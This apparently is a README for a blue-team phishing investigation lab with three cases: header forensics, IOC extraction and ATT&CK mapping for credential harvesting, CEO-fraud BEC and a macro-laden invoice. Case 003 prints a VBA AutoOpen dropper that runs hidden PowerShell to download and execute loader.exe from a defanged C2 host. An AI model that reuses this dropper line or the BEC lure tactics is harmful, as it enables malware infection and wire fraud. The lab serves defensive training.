# Phishing Email Analysis Lab 🎣

**Hands-on phishing investigation lab: email header analysis, IOC extraction, domain attribution, and written investigation reports.**

[![Status](https://img.shields.io/badge/status-active-success)]()
[![Focus](https://img.shields.io/badge/focus-blue_team-blue)]()
[![Type](https://img.shields.io/badge/type-DFIR_lab-red)]()

**Author:** Ariful Hoque
**LinkedIn:** [linkedin.com/in/contactariful](https://linkedin.com/in/contactariful)

> All emails analysed in this lab are sourced from public phishing archives (PhishTank, OpenPhish) or synthetic examples created for training. No live malicious infrastructure is contacted.

---

## 🎯 Purpose

This lab documents a structured process for analysing phishing emails from initial triage through to a complete written investigation report — the same workflow used in a real SOC Tier 1/2 environment.

**Skills practised:**
- Email header forensics (Received chain, SPF/DKIM/DMARC validation)
- Malicious URL and domain analysis
- IP geolocation and ASN attribution
- IOC extraction and documentation
- Writing structured incident investigation reports

---

## 🔬 Analysis Methodology

Each investigation follows a five-phase process:

```
1. TRIAGE        → Classify email type, assess urgency, assign severity
2. HEADER ANALYSIS  → Trace delivery path, validate SPF/DKIM/DMARC
3. PAYLOAD ANALYSIS → Inspect URLs, attachments, embedded content
4. IOC EXTRACTION   → Document all indicators of compromise
5. REPORTING     → Write structured investigation report
```

---

## 📂 Lab Cases

### Case 001 — Credential Harvesting (Microsoft 365 Impersonation)

**Phishing type:** Credential harvesting via fake Microsoft 365 login page
**Sender spoofing:** Display name "Microsoft Security Team", actual domain `micros0ft-alerts[.]com`
**Target:** Corporate email users

**Header Analysis (Received chain):**
```
Received: from mail.micros0ft-alerts.com (185.220.101.47)
          by mx.victim-corp.com; Sun, 5 Jan 2025 09:14:33 +0000
Return-Path: <noreply@micros0ft-alerts.com>
From: "Microsoft Security Team" <noreply@micros0ft-alerts.com>
Reply-To: harvest@proton[.]me
X-Mailer: PHPMailer 6.1.8
```

**SPF/DKIM/DMARC result:**
```
Authentication-Results:
  spf=fail (micros0ft-alerts.com: no SPF record)
  dkim=none
  dmarc=fail (policy=none)
```

**Key observations:**
- Originating IP `185.220.101.47` resolves to a Tor exit node (AS60729, Zwiebelfreunde e.V.)
- Domain `micros0ft-alerts[.]com` registered 4 days before campaign (domain age: new)
- X-Mailer header reveals PHPMailer — typical bulk phishing infrastructure
- Reply-To redirects responses to a ProtonMail harvesting address
- No DKIM signature — legitimate Microsoft mail always signs with DKIM

**Malicious URL extracted:**
```
hxxps://micros0ft-alerts[.]com/secure/verify?token=eyJhbGciOiJIUzI1NiJ9...
```

**IOCs:**
```
Domain:   micros0ft-alerts[.]com
IP:       185.220.101.47
Email:    noreply@micros0ft-alerts[.]com
URL:      hxxps://micros0ft-alerts[.]com/secure/verify
Hash (URL defanged SHA256): a3f9c2... [see iocs/case-001.json]
```

**Verdict:** Confirmed phishing. Credential harvesting campaign impersonating Microsoft. DMARC fail, Tor exit node origin, newly registered typosquat domain.

---

### Case 002 — Business Email Compromise (CEO Fraud / Wire Transfer)

**Phishing type:** BEC — fake CEO urgency request for wire transfer
**Technique:** Lookalike domain + display name impersonation
**Target:** Finance department

**Header Analysis:**
```
From: "James Hartley CEO" <james.hartley@acme-corp-uk[.]com>
      (legitimate domain: acme-corp.co.uk)
Received: from smtp.privateemail.com (69.167.143.100)
X-Originating-IP: 102.89.47.221  (Lagos, Nigeria — AS37076 Airtel Nigeria)
```

**Key observations:**
- Lookalike domain `acme-corp-uk[.]com` vs legitimate `acme-corp.co.uk` — registered 3 days prior
- Originating IP geolocates to Nigeria, inconsistent with UK-based CEO
- Email sent at 23:47 UTC — outside business hours, creates urgency pressure
- No thread history, no prior correspondence from this address
- Body contains urgent language: "time-sensitive wire transfer", "do not discuss with anyone"

**Social engineering indicators:**
- Authority: CEO impersonation
- Urgency: "must complete today"
- Secrecy: "do not discuss with finance team"
- Isolation: bypasses normal approval chain

**IOCs:**
```
Domain:   acme-corp-uk[.]com
IP:       69.167.143.100  (smtp relay)
IP:       102.89.47.221   (originating, Nigeria)
```

**Verdict:** Confirmed BEC. CEO fraud / wire transfer scam. Classic three-factor BEC structure: lookalike domain, geographic inconsistency, urgency + secrecy pressure.

---

### Case 003 — Spear Phishing with Malicious Attachment

**Phishing type:** Targeted spear phishing, macro-enabled document
**Lure:** Fake invoice from known supplier
**Technique:** Attached .docm file with VBA macro dropper

**Header Analysis:**
```
From: "Accounts Payable" <ap@supplierXYZ-invoices[.]co.uk>
      (legitimate domain: supplierxyz.co.uk)
Subject: Invoice #INV-2025-0147 — Payment Required
```

**Attachment analysis:**
```
Filename: Invoice_INV-2025-0147.docm
MD5:      d41d8cd98f00b204e9800998ecf8427e  [defanged for lab]
File type: Office Open XML with macro content
Macro trigger: AutoOpen() → downloads payload from C2
C2 URL:   hxxps://cdn-updates[.]net/loader.exe
```

**Macro behaviour (static analysis):**
```vba
Sub AutoOpen()
    Dim url As String
    url = "hxxps://cdn-updates[.]net/loader.exe"
    Shell "powershell -WindowStyle Hidden -Command Invoke-WebRequest " & url & " -OutFile $env:TEMP\svc.exe; Start-Process $env:TEMP\svc.exe"
End Sub
```

**IOCs:**
```
Domain:   supplierXYZ-invoices[.]co.uk
Domain:   cdn-updates[.]net  (C2)
File:     Invoice_INV-2025-0147.docm
Technique: T1566.001 (Spear Phishing Attachment) — MITRE ATT&CK
Technique: T1059.001 (PowerShell execution) — MITRE ATT&CK
Technique: T1105 (Ingress Tool Transfer) — MITRE ATT&CK
```

**Verdict:** Confirmed spear phishing with macro dropper. High severity. Recommend immediate blocking of C2 domain, user notification, and endpoint scan for `svc.exe` in %TEMP%.

---

## 🔍 Tools Used

| Tool | Purpose |
|------|---------|
| MXToolbox Header Analyser | Email header parsing and delivery chain visualisation |
| VirusTotal | Domain, IP, and file hash reputation lookup |
| URLScan.io | Safe URL analysis and screenshot |
| AbuseIPDB | IP reputation and abuse history |
| WHOIS / DomainTools | Domain registration date and registrant data |
| Thunderbird (offline) | Safe email viewing without rendering active content |
| CyberChef | Decoding base64/URL encoded strings in payloads |

---

## 📋 IOC Format Used

All IOCs are defanged to prevent accidental clicks:
- Domains: `example[.]com`
- URLs: `hxxps://` prefix
- IPs in reports: plaintext (safe to document)

IOC exports per case available in `/iocs/` folder as JSON (STIX-lite format).

---

## 📝 Investigation Report Template

Each case produces a structured report covering:

```
INVESTIGATION REPORT
====================
Case ID:          [unique identifier]
Date/Time:        [UTC timestamp]
Analyst:          Ariful Hoque
Severity:         Critical / High / Medium / Low

EXECUTIVE SUMMARY
  One-paragraph description of what happened.

TECHNICAL FINDINGS
  - Header analysis results
  - Authentication check results (SPF/DKIM/DMARC)
  - URL/attachment analysis
  - Infrastructure attribution

INDICATORS OF COMPROMISE
  - Domains, IPs, URLs, file hashes

MITRE ATT&CK MAPPING
  - Relevant technique IDs and names

RECOMMENDED ACTIONS
  - Immediate containment steps
  - Blocking recommendations
  - User notification guidance
  - Detection rule suggestions
```

---

## 🎓 Learning Outcomes

Working through this lab builds the following SOC analyst competencies:

- Reading and interpreting full email headers including multi-hop Received chains
- Identifying SPF, DKIM, and DMARC failures and understanding their significance
- Recognising social engineering patterns (BEC, urgency, authority, secrecy)
- Mapping observed techniques to MITRE ATT&CK framework entries
- Producing written investigation reports suitable for escalation or ticketing
- Safe handling of potentially malicious content

---

## 📚 References

- [PhishTank](https://phishtank.com) — Public phishing URL database
- [MITRE ATT&CK T1566](https://attack.mitre.org/techniques/T1566/) — Phishing technique coverage
- [Google Admin Toolbox Message Header](https://toolbox.googleapps.com/apps/messageheader/) — Header parser
- [MXToolbox](https://mxtoolbox.com) — SPF/DKIM/DMARC validation
